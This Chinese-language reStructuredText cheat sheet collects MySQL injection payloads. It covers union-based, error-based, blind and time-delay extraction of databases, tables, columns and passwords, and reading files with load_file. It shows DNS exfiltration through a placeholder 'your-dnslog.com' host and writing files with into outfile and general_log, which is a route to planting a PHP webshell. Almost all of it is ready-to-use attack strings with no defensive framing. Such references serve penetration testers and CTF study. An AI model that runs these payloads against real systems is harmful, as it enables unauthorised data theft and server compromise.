MySQL Payload
========================================

常见Payload
----------------------------------------
- Version 
    - ``SELECT @@version``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT 1 --+ comment``
    - ``SELECT 1 # comment``
    - ``SELECT /*comment*/1``
- Space
    - ``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``
- Current User
    - ``SELECT user()``
    - ``SELECT system_user()``
- List User
    - ``SELECT user FROM mysql.user``
- Current Database
    - ``SELECT database()``
- List Database
    - ``SELECT schema_name FROM information_schema.schemata``
- List Tables
    - ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- List Columns
    - ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- If
    - ``SELECT if(1=1,'foo','bar');`` return 'foo'
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT 0x414243`` => return ``ABC``
- Delay
    - ``sleep(1)``
    - ``SELECT BENCHMARK(1000000,MD5('A'))``
- Read File
    - ``select @@datadir``
    - ``select load_file('databasename/tablename.MYD')``
- Blind
    - ``ascii(substring(str,pos,length)) & 32 = 1``
- Error Based
    - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
    - ``select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))``
- Change Password
    - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
- DNS log
    - ``select load_file(concat('\\\\',user(),'.your-dnslog.com'));``
    - `dnslog <http://dnslog.cn/>`_

**注意：mysql 5.0 之后才有** ``infomation_schema`` **这个表**

常用系统注入函数
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- version()
- user()
- database()
- @@datadir  数据库路径
- @@version_compile_os  操作系统版本

报错注入常见函数
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- extractvalue
- updatexml
- GeometryCollection
- linestring
- multilinestring
- multipoint
- multipolygon
- polygon
- exp

其他常见函数
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- hex()
- ascii()
- length()
- substring()
- mid()
- elt()
- concat()
- concat_ws()
- group_concat()

常见注入方法
----------------------------------------

联合注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql
    
    ?id=1' order by 4--+
    ?id=0' union select 1,2,3,database()--+
    ?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
    ?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name="users" --+
    #group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name

    ?id=0' union select 1,2,3,group_concat(password) from users --+
    #group_concat 可替换为 concat_ws(',',id,users,password )

    ?id=0' union select 1,2,3,password from users limit 0,1--+


报错注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql
    
    1.floor()
    select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

    2.extractvalue()
    select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

    3.updatexml()
    select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

    4.geometrycollection()
    select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

    5.multipoint()
    select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

    6.polygon()
    select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

    7.multipolygon()
    select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

    8.linestring()
    select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

    9.multilinestring()
    select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

    10.exp()
    select * from test where id=1 and exp(~(select * from(select user())a));

报错注入例子
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

    爆库：?id=1' and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
    爆表：?id=1' and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +
    爆字段：?id=1' and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
    爆数据：?id=1' and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +

    #concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)


写文件
----------------------------------------

写文件前提
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- root 权限
- 知晓文件绝对路径
- 写入的路径存在写入权限
- secure_file_priv 允许向对应位置写入
- ``select count(file_priv) from mysql.user``

基于 into 写文件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

    union select 1,1,1 into outfile '/tmp/demo.txt'
    union select 1,1,1 into dumpfile '/tmp/demo.txt'

dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏

基于 log 写文件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

    show variables like '%general%';
    set global general_log = on;
    set global general_log_file = '/path/to/file';
    select '<?php var_dump("test");?>';
    set global general_log_file = '/original/path';
    set global general_log = off;


参考链接
----------------------------------------
- `MySQL注入常用函数 <https://www.jianshu.com/p/93924686345e>`_